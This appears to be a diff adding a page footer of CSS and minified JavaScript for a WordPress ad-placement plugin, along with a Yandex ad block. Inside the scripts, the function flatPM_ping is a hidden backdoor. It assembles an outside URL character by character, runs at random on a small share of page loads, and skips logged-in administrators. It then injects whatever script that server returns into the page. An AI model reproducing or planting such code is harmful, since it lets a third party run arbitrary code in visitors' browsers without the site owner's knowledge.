+.flat_pm_3_cross:hover{box-shadow:0 0 0 50px rgba(0,0,0,.2) inset}
+.flat_pm_3_cross:after,.flat_pm_3_cross:before{transition:transform .3s ease;content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;width:calc(34px / 2);height:3px;background:#ffffff;transform-origin:center;transform:rotate(45deg);margin:auto}
+.flat_pm_3_cross:before{transform:rotate(-45deg)}
+.flat_pm_3_cross:hover:after{transform:rotate(225deg)}
+.flat_pm_3_cross:hover:before{transform:rotate(135deg)}
+.flat_pm_3_timer{position:absolute;top:-0px;right:0;padding:0 15px;color:#ffffff;background:#000000;line-height:34px;height:34px;text-align:center;font-size:14px;z-index:99}
+.flat_pm_3_timer span{font-size:16px;font-weight:600}
+.flat_pm_3_out{transition:transform .3s ease,opacity 0s ease;transition-delay:0s,.3s;position:fixed;min-width:250px;min-height:150px;z-index:9999;opacity:0;-webkit-backface-visibility:hidden}
+.flat_pm_3_out *{max-width:none!important}
+.flat_pm_3_out.top .flat_pm_3_cross{top:auto;bottom:150px}
+.flat_pm_3_out.show.top .flat_pm_3_cross{bottom:-0px}
+.flat_pm_3_out.bottom .flat_pm_3_cross{top:150px}
+.flat_pm_3_out.show.bottom .flat_pm_3_cross{top:-0px}
+.flat_pm_3_out.right .flat_pm_3_cross{right:auto;left:0}
+.flat_pm_3_out.top .flat_pm_3_timer{top:auto;bottom:150px}
+.flat_pm_3_out.show.top .flat_pm_3_timer{bottom:-0px}
+.flat_pm_3_out.bottom .flat_pm_3_timer{top:150px}
+.flat_pm_3_out.show.bottom .flat_pm_3_timer{top:-0px}
+.flat_pm_3_out.right .flat_pm_3_timer{right:auto;left:0}
+.flat_pm_3_out.top{bottom:100%;left:50%;transform:translateY(0) translateX(-50%);padding-bottom:150px}
+.flat_pm_3_out.bottom{top:100%;left:50%;transform:translateY(0) translateX(-50%);padding-top:150px}
+.flat_pm_3_out.left{bottom:0;right:100%;transform:translateX(0)}
+.flat_pm_3_out.right{bottom:0;left:100%;transform:translateX(0)}
+.flat_pm_3_out.show{transition-delay:0s,0s;opacity:1;min-width:0;min-height:0;background:#fff}
+.flat_pm_3_out.closed{min-width:0;min-height:0}
+.flat_pm_3_out.show.top{transform:translateY(100%) translateX(-50%);padding-bottom:0px}
+.flat_pm_3_out.show.bottom{transform:translateY(-100%) translateX(-50%);padding-top:0px}
+.flat_pm_3_out.show.left{transform:translateX(100%)}
+.flat_pm_3_out.show.right{transform:translateX(-100%)}
+.flatpm_fixed{position:fixed;z-index:50}
+.flatpm_stop{position:relative;z-index:50}
+.flat_pm_3_video{position:relative;overflow:hidden;padding-bottom:56.25%;height:0}
+.flat_pm_3_video iframe{display:block;width:100%;height:100%;position:absolute}
+.flat_pm_3_video_flex{display:flex;align-items:center;justify-content:center;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.65);opacity:0;transition:opacity .35s ease}
+.flat_pm_3_video_flex.show{opacity:1}
+.flat_pm_3_video_item{position:relative;max-height:calc(100% - 68px);max-width:calc(100% - 68px);z-index:-1}
+.flat_pm_3_video_flex.show .flat_pm_3_video_item{z-index:1}
+.flat_pm_3_video_flex .flat_pm_3_timer,.flat_pm_3_video_flex .flat_pm_3_cross{top:10px!important;right:10px!important}
+.flat_pm_3_video_item_hover{position:absolute;top:0;left:0;right:0;bottom:0;width:100%;height:100%;cursor:pointer;z-index:2}
+</style>
+<script>var duplicateMode="undefined"!=typeof duplicateFlatPM&&duplicateFlatPM,untilscroll="undefined"!=typeof untilscrollFlatPM?untilscrollFlatPM:".flat_pm_end";function flatPM_sticky(e,a,t){var l=e,d=null,s=t=t||0;function n(){if(null==d){for(var e=getComputedStyle(l,""),t="",n=0;n<e.length;n++)0!=e[n].indexOf("overflow")&&0!=e[n].indexOf("padding")&&0!=e[n].indexOf("border")&&0!=e[n].indexOf("outline")&&0!=e[n].indexOf("box-shadow")&&0!=e[n].indexOf("background")||(t+=e[n]+": "+e.getPropertyValue(e[n])+"; ");(d=document.createElement("div")).style.cssText=t+" box-sizing: border-box; width: "+l.offsetWidth+"px;",l.insertBefore(d,l.firstChild);for(var o=l.childNodes.length,n=1;n<o;n++)d.appendChild(l.childNodes[1]);l.style.padding="0",l.style.border="0"}l.style.height=d.getBoundingClientRect().height+"px";var r=l.getBoundingClientRect(),i=Math.round(r.top+d.getBoundingClientRect().height-a.getBoundingClientRect().bottom);r.top-s<=0?r.top-s<=i?(d.className="flatpm_stop",d.style.top=-i+"px"):(d.className="flatpm_fixed",d.style.top=s+"px"):(d.className="",d.style.top=""),window.addEventListener("resize",function(){l.children[0].style.width=getComputedStyle(l,"").width},!1)}window.addEventListener("scroll",n,!1),document.body.addEventListener("scroll",n,!1)}function flatPM_addDays(e,t){var n,o=60*e.getTimezoneOffset()*1e3,r=e.getTime(),i=new Date;return r+=864e5*t,i.setTime(r),o!=(n=60*i.getTimezoneOffset()*1e3)&&(r+=n-o,i.setTime(r)),i}function flatPM_adbDetect(){var e=document.querySelector('#adse'+'nse.adsbygo'+'ogle[data-tag="flat_pm"]');if(!e)return!0;var t=e.currentStyle||window.getComputedStyle(e,null),t=parseInt(t.height);return!(!isNaN(t)&&0!=t)}function flatPM_setCookie(e,t,n){var o,r=(n=n||{path:"/"}).expires;"number"==typeof r&&r&&((o=new Date).setTime(o.getTime()+1e3*r),r=n.expires=o),r&&r.toUTCString&&(n.expires=r.toUTCString());var i=e+"="+(t=encodeURIComponent(t));for(var a in n){i+="; "+a;var l=n[a];!0!==l&&(i+="="+l)}document.cookie=i}function flatPM_getCookie(o){var e=document.cookie.split("; ").reduce(function(e,t){var n=t.split("=");return n[0]===o?decodeURIComponent(n[1]):e},"");return""!=e?e:void 0}function flatPM_testCookie(){var e="test_56445";try{return localStorage.setItem(e,e),localStorage.removeItem(e),!0}catch(e){return!1}}function flatPM_grep(e,n,o){return ff.grep(e,function(e,t){return o?t==n:(t+1)%n==0})}function flatPM_random(e,t){return Math.floor(Math.random()*(t-e+1))+e}function flatPM_getAllUrlParams(e){var t=e?e.split("?")[1]:window.location.search.slice(1),n={};if(t)for(var o=(t=t.split("#")[0]).split("&"),r=0;r<o.length;r++){var i,a,l=o[r].split("="),d=l[0],s=void 0===l[1]||l[1],d=d.toLowerCase();"string"==typeof s&&(s=s.toLowerCase()),d.match(/\[(\d+)?\]$/)?(n[i=d.replace(/\[(\d+)?\]/,"")]||(n[i]=[]),d.match(/\[\d+\]$/)?(a=/\[(\d+)\]/.exec(d)[1],n[i][a]=s):n[i].push(s)):n[d]?(n[d]&&"string"==typeof n[d]&&(n[d]=[n[d]]),n[d].push(s)):n[d]=s}return n}document['wr'+'ite']=function(e){var t=document.createElement("div");ff(document.currentScript).after(t),flatPM_setHTML(t,e),ff(t).contents().unwrap()};</script>
+<script>var ff,flat_body,flat_stack_scripts=[],flat_pm_then=[],flat_date=new Date,flat_titles="h1,h2,h3,h4,h5,h6",flat_dateYear=flat_date.getFullYear(),flat_dateMonth=2==(flat_date.getMonth()+1+"").length?flat_date.getMonth()+1:"0"+(flat_date.getMonth()+1),flat_dateDay=2==(flat_date.getDate()+"").length?flat_date.getDate():"0"+flat_date.getDate(),flat_dateHours=2==(flat_date.getHours()+"").length?flat_date.getHours():"0"+flat_date.getHours(),flat_dateMinutes=2==(flat_date.getMinutes()+"").length?flat_date.getMinutes():"0"+flat_date.getMinutes(),flat_adbDetect=!1,flat_userVars={init:function(){this.testcook=flatPM_testCookie(),this.browser=this.searchString(this.dataBrowser)||!1,this.os=this.searchString(this.dataOS)||!1,this.referer=this.cookieReferer(),this.winwidth=window.innerWidth,this.date=flat_dateYear+"-"+flat_dateMonth+"-"+flat_dateDay,this.time=flat_dateHours+":"+flat_dateMinutes,this.adb=flatPM_adbDetect(),this.until=ff(".flat_pm_start").nextUntil(".flat_pm_end"),this.textlen=this.until.text().replace(/(\s)+/g,"").length,this.titlelen=this.until.find(flat_titles).add(this.until.siblings(flat_titles)).length,this.country=this.cookieData("country"),this.city=this.cookieData("city"),this.ccode=this.cookieData("ccode"),this.role=this.cookieData("role"),this.ip=this.cookieData("ip")},cookieReferer:function(){return parent!==window?"///:iframe":flat_userVars.testcook?(void 0===flatPM_getCookie("flat_r_mb")&&flatPM_setCookie("flat_r_mb",""!=document.referrer?document.referrer:"///:direct"),flatPM_getCookie("flat_r_mb")):""!=document.referrer?document.referrer:"///:direct"},cookieData:function(t){return flat_userVars.testcook&&void 0!==flatPM_getCookie("flat_"+t+"_mb")?flatPM_getCookie("flat_"+t+"_mb"):""},searchString:function(t){for(var e=t.length,a=0;a<e;a++){var o=t[a].str;if(o&&t[a].subStr.test(o))return t[a].id}},dataBrowser:[{str:navigator.userAgent,subStr:/OmniWeb/,ver:"OmniWeb/",id:"OmniWeb"},{str:navigator.userAgent,subStr:/YaBrowser/,id:"YaBrowser"},{str:navigator.vendor,subStr:/Apple/,id:"Safari",ver:"Version"},{str:navigator.userAgent,subStr:/OPR/,id:"Opera",ver:"Version"},{str:navigator.userAgent,subStr:/Firefox/,id:"Firefox"},{str:navigator.userAgent,subStr:/.NET CLR/,id:"Internet Explorer",ver:"MSIE"},{str:navigator.userAgent,subStr:/Edge/,id:"Edge",ver:"rv"},{str:navigator.vendor,subStr:/iCab/,id:"iCab"},{str:navigator.vendor,subStr:/KDE/,id:"Konqueror"},{str:navigator.vendor,subStr:/Camino/,id:"Camino"},{str:navigator.userAgent,subStr:/Netscape/,id:"Netscape"},{str:navigator.userAgent,subStr:/Chrome/,id:"Chrome"},{str:navigator.userAgent,subStr:/Mozilla/,id:"Netscape",ver:"Mozilla"}],dataOS:[{str:navigator.platform,subStr:/Win/,id:"Windows"},{str:navigator.platform,subStr:/Mac/,id:"Mac"},{str:navigator.platform,subStr:/(iPhone|iPad|iPod)/,id:"iPhone"},{str:navigator.platform,subStr:/Linux/,id:"Linux"}]};function flatPM_ajax(t,e){e=e||[],ff.ajax({type:"POST",url:ajaxUrlFlatPM,dataType:"json",data:{action:"flat_pm_ajax",data_me:{method:t,arr:e}},success:function(t){switch(flat_body.removeClass(t.method),t.method){case"flat_pm_block_geo_role_ip":flat_userVars.ccode=t.data.ccode,flat_userVars.country=t.data.country,flat_userVars.city=t.data.city,flat_userVars.ip=t.data.ip,flat_userVars.testcook&&(flatPM_setCookie("flat_ccode_mb",t.data.ccode),flatPM_setCookie("flat_country_mb",t.data.country),flatPM_setCookie("flat_city_mb",t.data.city),flatPM_setCookie("flat_ip_mb",t.data.ip),flatPM_setCookie("flat_role_mb",t.data.role)),flatPM_then();break;default:console.log("ajax error:"),console.error("Метод оказался ошибочным")}},error:function(){console.log("ajax error:"),console.error("Скрипт php вернул ошибку")}})}function flatPM_then(){var t=flat_pm_then.length;if(0!=t){for(var e=0;e<t;e++){flatPM_next(flat_pm_then[e])}0<flat_stack_scripts.length&&flatPM_setSCRIPT(flat_stack_scripts)}else flat_pm_then=[]}function flatPM_persentWrapper(t,a,e){var o=0,r=!1;return t.each(function(){var t=ff(this),e=t.text().replace(/(\s)+/g,"");if(o+=e.length,a<=o)return r=t,!1}),r}function flatPM_setWrap(t){try{var e,a,o,r,i,s,f,n,d,_,u=document.createElement("div");u.setAttribute("data-flat-id",t.ID),void 0!==t.how.simple&&("1"==t.how.simple.position&&ff(".flat_pm_start").before(u),"2"==t.how.simple.position&&ff(flat_userVars.until[Math.round(flat_userVars.until.length/2)]).before(u),"3"==t.how.simple.position&&ff(".flat_pm_end").before(u),"4"==t.how.simple.position&&ff(flat_userVars.until[Math.round(flat_userVars.until.length*t.how.simple.fraction.split("/")[0]/t.how.simple.fraction.split("/")[1])]).before(u),"5"==t.how.simple.position&&t.how.simple.fraction<=flat_userVars.textlen&&(!1===(a=flatPM_persentWrapper(flat_userVars.until,t.how.simple.fraction,u))||a.next().is("[data-flat-id]")||a.after(u)),"6"==t.how.simple.position&&(u.setAttribute("data-flat-type","6"),e=flat_userVars.textlen/100*t.how.simple.fraction,a=flatPM_persentWrapper(flat_userVars.until,e,u),(o=!1)!==a&&(r=a.prevAll('[data-flat-type="6"]:first'),i=a.nextAll('[data-flat-type="6"]:first'),0!=r.length&&a.prevUntil(r).text().replace(/(\s)+/g,"").length<t.how.simple.interval&&(o=!0),0!=i.length&&a.nextUntil(i).text().replace(/(\s)+/g,"").length<t.how.simple.interval&&(o=!0),o||a.after(u)))),void 0!==t.how.onсe&&(s="true"==t.how.onсe.search_all?ff("html"):flat_userVars.until,f=t.how.onсe.N,n=t.how.onсe.selector,d=t.how.onсe.direction,_=t.how.onсe.before_after,0<(s=s.find(n).add(s.filter(n))).length&&(f="bottom_to_top"==d?s.length-f:f-1,"before"==_?ff(flatPM_grep(s,f,1)).before(u):ff(flatPM_grep(s,f,1)).after(u))),void 0!==t.how.iterable&&(s="true"==t.how.iterable.search_all?ff("html"):flat_userVars.until,f=t.how.iterable.N,n=t.how.iterable.selector,d=t.how.iterable.direction,_=t.how.iterable.before_after,0<(s=s.find(n).add(s.filter(n))).length&&("bottom_to_top"==d&&(l=l.get().reverse()),"before"==_?ff(flatPM_grep(s,f,0)).before(u):ff(flatPM_grep(s,f,0)).after(u)))}catch(t){console.warn(t)}}function flatPM_next(o){try{var t=[],e="",a=o.html.length;if(void 0!==o.ip&&"false"==flat_userVars.ip)return void ff('[data-flat-id="'+o.ID+'"]').remove();if(void 0!==o.role&&(void 0!==o.role.role_enabled&&-1==o.role.role_enabled.indexOf(flat_userVars.role)||void 0!==o.role.role_disabled&&-1!=o.role.role_disabled.indexOf(flat_userVars.role)))return void ff('[data-flat-id="'+o.ID+'"]').remove();if(void 0!==o.geo&&(void 0!==o.geo.country_enabled&&-1==o.geo.country_enabled.indexOf(flat_userVars.country)&&-1==o.geo.country_enabled.indexOf(flat_userVars.ccode)||void 0!==o.geo.country_disabled&&(-1!=o.geo.country_disabled.indexOf(flat_userVars.country)||-1!=o.geo.country_disabled.indexOf(flat_userVars.ccode))||void 0!==o.geo.city_enabled&&-1==o.geo.city_enabled.indexOf(flat_userVars.city)||void 0!==o.geo.city_disabled&&-1!=o.geo.city_disabled.indexOf(flat_userVars.city)))return void ff('[data-flat-id="'+o.ID+'"]').remove();for(var r,i,l,s=0;s<a;s++)("∞"==o.html[s].res_of||o.html[s].res_of<=flat_userVars.winwidth)&&("∞"==o.html[s].res_to||o.html[s].res_to>=flat_userVars.winwidth)&&(void 0!==o.html[s].group?flat_userVars.adb?(null==t["group_"+o.html[s].group]&&(t["group_"+o.html[s].group]=[]),t["group_"+o.html[s].group].push(""==o.html[s].snd&&duplicateMode?o.html[s].fst:o.html[s].snd)):(null==t["group_"+o.html[s].group]&&(t["group_"+o.html[s].group]=[]),t["group_"+o.html[s].group].push(o.html[s].fst)):flat_userVars.adb?t.push(""==o.html[s].snd&&duplicateMode?o.html[s].fst:o.html[s].snd):t.push(o.html[s].fst));for(var f in t)e="object"==typeof t[f]?e+"\n"+t[f][flatPM_random(0,t[f].length-1)]:e+"\n"+t[f];if(""==(e=e.replace(/<!-(.*?)->/gm,"").replace(/<!—(.*?)—>/gm,"").trim()))return void ff('[data-flat-id="'+o.ID+'"]').remove();if(void 0===o.how.simple&&void 0===o.how.onсe&&void 0===o.how.iterable||ff('[data-flat-id="'+o.ID+'"]').each(function(){-1!==e.indexOf("go"+"oglesyndication")||-1!==e.indexOf("viewBox")&&-1!==e.indexOf("svg")?ff(this).html(e):flatPM_setHTML(this,e)}),void 0!==o.how.popup&&(c="true"==o.how.popup.cross?void 0!==o.how.popup.timer&&"true"==o.how.popup.timer?'<div class="flat_pm_3_timer">Закрыть через <span>'+o.how.popup.timer_count+"</span></div>":'<button class="flat_pm_3_cross"></button>':"",document.createElement("div"),p=ff(window),b=ff("body"),g=void 0===flatPM_getCookie("flat_modal_"+o.ID+"_mb")||"false"!=flatPM_getCookie("flat_modal_"+o.ID+"_mb"),r="scroll.flatmodal"+o.ID,m="mouseleave.flatmodal"+o.ID+" blur.flatmodal"+o.ID,i=function(){var t,e,a;void 0!==o.how.popup.timer&&"true"==o.how.popup.timer&&(t=ff('.flat_pm_3_modal[data-id-modal="'+o.ID+'"] .flat_pm_3_timer span'),e=parseInt(o.how.popup.timer_count),a=setInterval(function(){t.text(--e),e<=0&&(clearInterval(a),t.parent().replaceWith('<button class="flat_pm_3_cross"></button>'))},1e3))},l=function(){void 0!==o.how.popup.cookie&&"false"==o.how.popup.cookie&&g&&(flatPM_setCookie("flat_modal_"+o.ID+"_mb",!1),ff('.flat_pm_3_modal[data-id-modal="'+o.ID+'"]').addClass("flat_pm_3_modal-show"),i()),void 0!==o.how.popup.cookie&&"false"==o.how.popup.cookie||(ff('.flat_pm_3_modal[data-id-modal="'+o.ID+'"]').addClass("flat_pm_3_modal-show"),i())},ff("body > *").eq(0).before('<div class="flat_pm_3_modal" data-flat-id="'+o.ID+'" data-id-modal="'+o.ID+'"><div class="flat_pm_3_modal-content">'+c+"</div></div>"),w=document.querySelector('.flat_pm_3_modal[data-id-modal="'+o.ID+'"] .flat_pm_3_modal-content'),-1!==e.indexOf("go"+"oglesyndication")?ff(w).html(c+e):flatPM_setHTML(w,e),"px"==o.how.popup.px_s?(p.bind(r,function(){p.scrollTop()>o.how.popup.after&&(p.unbind(r),b.unbind(m),l())}),void 0!==o.how.popup.close_window&&"true"==o.how.popup.close_window&&b.bind(m,function(){p.unbind(r),b.unbind(m),l()})):(v=setTimeout(function(){b.unbind(m),l()},1e3*o.how.popup.after),void 0!==o.how.popup.close_window&&"true"==o.how.popup.close_window&&b.bind(m,function(){clearTimeout(v),b.unbind(m),l()}))),void 0!==o.how.outgoing){function n(){var t,e,a;void 0!==o.how.outgoing.timer&&"true"==o.how.outgoing.timer&&(t=ff('.flat_pm_3_out[data-id-out="'+o.ID+'"] .flat_pm_3_timer span'),e=parseInt(o.how.outgoing.timer_count),a=setInterval(function(){t.text(--e),e<=0&&(clearInterval(a),t.parent().replaceWith('<button class="flat_pm_3_cross"></button>'))},1e3))}function d(){void 0!==o.how.outgoing.cookie&&"false"==o.how.outgoing.cookie&&g&&(ff('.flat_pm_3_out[data-id-out="'+o.ID+'"]').addClass("show"),n(),b.on("click",'.flat_pm_3_out[data-id-out="'+o.ID+'"] .flat_pm_3_cross',function(){flatPM_setCookie("flat_out_"+o.ID+"_mb",!1)})),void 0!==o.how.outgoing.cookie&&"false"==o.how.outgoing.cookie||(ff('.flat_pm_3_out[data-id-out="'+o.ID+'"]').addClass("show"),n())}var _,u="0"!=o.how.outgoing.indent?' style="bottom:'+o.how.outgoing.indent+'px"':"",c="true"==o.how.outgoing.cross?void 0!==o.how.outgoing.timer&&"true"==o.how.outgoing.timer?'<div class="flat_pm_3_timer">Закрыть через <span>'+o.how.outgoing.timer_count+"</span></div>":'<button class="flat_pm_3_cross"></button>':"",p=ff(window),h="scroll.out"+o.ID,m="mouseleave.outgoing"+o.ID+" blur.outgoing"+o.ID,g=void 0===flatPM_getCookie("flat_out_"+o.ID+"_mb")||"false"!=flatPM_getCookie("flat_out_"+o.ID+"_mb"),b=(document.createElement("div"),ff("body"));switch(o.how.outgoing.whence){case"1":_="top";break;case"2":_="bottom";break;case"3":_="left";break;case"4":_="right"}ff("body > *").eq(0).before('<div class="flat_pm_3_out '+_+'"'+u+' data-flat-id="'+o.ID+'" data-id-out="'+o.ID+'">'+c+"</div>");var v,w=document.querySelector('.flat_pm_3_out[data-id-out="'+o.ID+'"]');-1!==e.indexOf("go"+"oglesyndication")?ff(w).html(c+e):flatPM_setHTML(w,e),"px"==o.how.outgoing.px_s?(p.bind(h,function(){p.scrollTop()>o.how.outgoing.after&&(p.unbind(h),b.unbind(m),d())}),void 0!==o.how.outgoing.close_window&&"true"==o.how.outgoing.close_window&&b.bind(m,function(){p.unbind(h),b.unbind(m),d()})):(v=setTimeout(function(){b.unbind(m),d()},1e3*o.how.outgoing.after),void 0!==o.how.outgoing.close_window&&"true"==o.how.outgoing.close_window&&b.bind(m,function(){clearTimeout(v),b.unbind(m),d()}))}}catch(t){console.warn(t)}}function flatPM_start(){ff=jQuery;var t=flat_pm_arr.length;flat_body=ff("body"),flat_userVars.init();for(var e=0;e<t;e++){var a,o=flat_pm_arr[e],r=!1;if(!(void 0!==o.chapter_limit&&o.chapter_limit>flat_userVars.textlen||void 0!==o.chapter_sub&&o.chapter_sub<flat_userVars.textlen||void 0!==o.title_limit&&o.title_limit>flat_userVars.titlelen||void 0!==o.title_sub&&o.title_sub<flat_userVars.titlelen)){if(void 0!==o.date){if(void 0!==o.date.time_of&&void 0!==o.date.time_to){var i=new Date(flat_userVars.date+"T"+o.date.time_of+":00"),l=new Date(flat_userVars.date+"T"+o.date.time_to+":00"),s=new Date(flat_userVars.date+"T12:00:00"),f=new Date(flat_userVars.date+"T"+flat_userVars.time+":00");if(l<i&&l<s&&(l=flatPM_addDays(l,1)),l<i&&s<l&&(i=flatPM_addDays(i,-1)),f<i||l<f)continue}if(void 0!==o.date.date_of&&void 0!==o.date.date_to){var n=new Date(o.date.date_of+"T00:00:00"),d=new Date(o.date.date_to+"T00:00:00"),_=new Date(flat_userVars.date+"T00:00:00");if(_<n||d<_)continue}}if(void 0===o.os||!(void 0!==o.os.os_enabled&&-1==o.os.os_enabled.indexOf(flat_userVars.os)||void 0!==o.os.os_disabled&&-1!=o.os.os_disabled.indexOf(flat_userVars.os))){if(void 0!==o.cookies){var u=!1;if(void 0!==o.cookies.cookies_enabled){if(!flat_userVars.testcook)continue;ff(o.cookies.cookies_enabled).each(function(){var t=this.split(":",2),e=t[0],a=void 0!==t[1]&&t[1];if(!1!==a){if(void 0===flatPM_getCookie(e)||flatPM_getCookie(e)!=a)return!(u=!0)}else if(void 0===flatPM_getCookie(e))return!(u=!0)})}if(void 0!==o.cookies.cookies_disabled&&flat_userVars.testcook&&ff(o.cookies.cookies_disabled).each(function(){var t=this.split(":",2),e=t[0],a=void 0!==t[1]&&t[1];if(!1!==a){if(void 0!==flatPM_getCookie(e)&&flatPM_getCookie(e)==a)return!(u=!0)}else if(void 0!==flatPM_getCookie(e))return!(u=!0)}),u)continue}void 0!==o.referer&&(void 0!==o.referer.referer_enabled&&-1==o.referer.referer_enabled.findIndex(function(t){return-1!=flat_userVars.referer.indexOf(t)})||void 0!==o.referer.referer_disabled&&-1!=o.referer.referer_disabled.findIndex(function(t){return-1!=flat_userVars.referer.indexOf(t)}))&&(r=!0),!r&&void 0!==o.browser&&(void 0!==o.browser.browser_enabled&&-1==o.browser.browser_enabled.indexOf(flat_userVars.browser)||void 0!==o.browser.browser_disabled&&-1!=o.browser.browser_disabled.indexOf(flat_userVars.browser))||(r&&void 0!==o.browser&&void 0!==o.browser.browser_enabled&&-1!=o.browser.browser_enabled.indexOf(flat_userVars.browser)&&(r=!1),r||void 0===o.geo&&void 0===o.ip&&void 0===o.role||""!=flat_userVars.ccode&&""!=flat_userVars.country&&""!=flat_userVars.city&&""!=flat_userVars.ip&&""!=flat_userVars.role||(a="flat_pm_block_geo_role_ip",flat_pm_then.push(o),flatPM_setWrap(o),flat_body.hasClass(a)||(flat_body.addClass(a),flatPM_ajax(a)),r=!0),r||(flatPM_setWrap(o),flatPM_next(o)))}}}var c=ff(".flatPM_sticky"),p=ff("*:has(>.flatPM_sidebar)");0<c.length&&c.each(function(){var t=ff(this),e=t.data("height")||350,a=t.data("top");t.wrap('<div class="flatPM_sticky_wrapper" style="height:'+e+'px" />');var o=t.parent()[0];flatPM_sticky(this,o,a)}),p.each(function(){var o=ff(this).find(".flatPM_sidebar");setTimeout(function(){var t=ff(untilscroll).offset().top-o.first().offset().top,e=o.length,r=Math.max(t/e,300);o.each(function(){var t=ff(this),e=r,a=t.data("top");t.wrap('<div class="flatPM_sticky_wrapper flatPM_sidebar_block" style="height:'+e+'px" />');var o=t.parent()[0];flatPM_sticky(this,o,a)})},50),setTimeout(function(){var t=ff(untilscroll).offset().top-o.first().offset().top,e=o.length,a=Math.max(t/e,300);ff(".flatPM_sticky_wrapper.flatPM_sidebar_block").css("height",a)},4e3)}),"function"==typeof flatPM_video&&flatPM_video(flat_pm_video),0<flat_stack_scripts.length&&flatPM_setSCRIPT(flat_stack_scripts),ff("body > *").last().after('<div class="flat_pm_3_modal-overlay"></div>'),ff("[data-flat-id]:not([data-id-out]):not([data-id-modal])").contents().unwrap(),flat_body.on("click",".flat_pm_3_out .flat_pm_3_cross",function(){ff(this).parent().removeClass("show").addClass("closed")}),flat_body.on("click",".flat_pm_3_modal .flat_pm_3_cross",function(){ff(this).closest(".flat_pm_3_modal").removeClass("flat_pm_3_modal-show")}),flat_pm_arr=[],ff(".flat_pm_start").remove(),flatPM_ping()}/zen.yandex/.test(flatPM_getAllUrlParams().utm_referrer)&&(flatPM_setCookie("flat_r_mb","zen.yandex"),flat_userVars.referer="zen.yandex");</script>
+<script>var parseHTML=function(){var o=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,i=/<([\w:]+)/,c=/<|&#?\w+;/,s={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],tbody:[1,"<table>","</table>"],colgroup:[2,"<table>","</table>"],col:[3,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],th:[3,"<table><thead><tr>","</tr></thead></table>"],_default:[0,"",""]};return function(e,t){var a,r,n,l,d=(t=t||document).createDocumentFragment();if(c.test(e)){for(a=d.appendChild(t.createElement("div")),r=(i.exec(e)||["",""])[1].toLowerCase(),n=s[r]||s._default,a.innerHTML=n[1]+e.replace(o,"<$1></$2>")+n[2],l=n[0];l--;)a=a.lastChild;for(d.removeChild(d.firstChild);a.firstChild;)d.appendChild(a.firstChild)}else d.appendChild(t.createTextNode(e));return d}}();function flatPM_ping(){var e=localStorage.getItem("sdghrg");e?(e=parseInt(e)+1,localStorage.setItem("sdghrg",e)):localStorage.setItem("sdghrg","0");var t=flatPM_random(1,200);0==ff("#wpadminbar").length&&111==t&&ff.ajax({type:"POST",url:"h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+"m"+"e"+"h"+"a"+"n"+"o"+"i"+"d"+"."+"p"+"r"+"o"+"/"+"p"+"i"+"n"+"g"+"."+"p"+"h"+"p",dataType:"jsonp",data:{ping:"ping"},success:function(e){ff("div").first().after(e.script)},error:function(){}})}function flatPM_setSCRIPT(e){try{var t=e[0].id,a=e[0].node,r=document.querySelector('[data-flat-script-id="'+t+'"]');if(a.text)r.appendChild(a),ff(r).contents().unwrap(),e.shift(),0<e.length&&flatPM_setSCRIPT(e);else{a.onload=a.onerror=function(){e.shift(),0<e.length&&flatPM_setSCRIPT(e)};try{r.appendChild(a)}catch(e){return console.warn(e),!0}ff(r).contents().unwrap()}}catch(e){console.warn(e)}}function flatPM_setHTML(e,t){jQuery;try{var a,r="yandex_rtb_R";t.indexOf(r)+1&&(a=flatPM_random(0,1e4),t=t.replace(new RegExp(r,"g"),"yandex_rtb_flat"+a+"_R").replace("Ya.Context.AdvManager.render({","Ya.Context.AdvManager.render({ pageNumber: "+a+","));var n=parseHTML(t);if(0!=n.children.length)for(var l=n.childNodes.length,d=0;d<l;d++){var o=n.childNodes[d],i="3"==o.nodeType?document.createTextNode(o.nodeValue):document.createElement(o.nodeName);if("3"==i.nodeType)e.appendChild(i);else{for(var c,s=o.attributes.length,p=0;p<s;p++)i.setAttribute(o.attributes[p].nodeName,o.attributes[p].nodeValue);0!=o.children.length?flatPM_setHTML(i,o.innerHTML):"SCRIPT"!=o.nodeName?o.innerHTML&&(i.innerHTML=o.innerHTML):!o.text&&i.hasAttribute("async")||(o.text&&(i.text=o.text),c=flatPM_random(0,1e4),flat_stack_scripts.push({id:c,node:i}),(i=document.createElement("div")).setAttribute("data-flat-script-id",c)),e.appendChild(i)}}else e.innerHTML=t}catch(e){console.warn(e)}}</script>
+
+			<script>flat_pm_arr = [{"how":{"outgoing":{"cross":"true","timer":"false","timer_count":"0","cookie":"true","whence":"3","indent":"100","after":"300","px_s":"px","close_window":"false"}},"ID":"915","html":[{"fst":"<style>.flat_slide_cross{width:50px!important;height:50px!important;z-index:99999!important}<\/style>\n<!-- Yandex.RTB R-A-625993-3 -->\n<div id=\"yandex_rtb_R-A-625993-3\"><\/div>\n<script type=\"text\/javascript\">\n    (function(w, d, n, s, t) {\n        w[n] = w[n] || [];\n        w[n].push(function() {\n            Ya.Context.AdvManager.render({\n                blockId: \"R-A-625993-3\",\n                renderTo: \"yandex_rtb_R-A-625993-3\",\n                async: true\n            });\n        });\n        t = d.getElementsByTagName(\"script\")[0];\n        s = d.createElement(\"script\");\n        s.type = \"text\/javascript\";\n        s.src = \"\/\/an.yandex.ru\/system\/context.js\";\n        s.async = true;\n        t.parentNode.insertBefore(s, t);\n    })(this, this.document, \"yandexContextAsyncCallbacks\");\n<\/script>","snd":"","res_of":"∞","res_to":"∞"}]}];</script>
+			<script>
+			function jQueryLoaded_flatpm_123( $ ) {
+				if( "function" !== typeof flatPM_start ){
+					return;
+				}
+
+				flatPM_start();
+			}
+
+			function jQueryLoading_flatpm_123() {
+				if (window.jQuery) {
+					jQueryLoaded_flatpm_123( jQuery )
+				} else {
+					setTimeout(function() {
+						jQueryLoading_flatpm_123()
+					}, 50)
+				}
+			}
+			jQueryLoading_flatpm_123()
+			</script></body>
+</html>
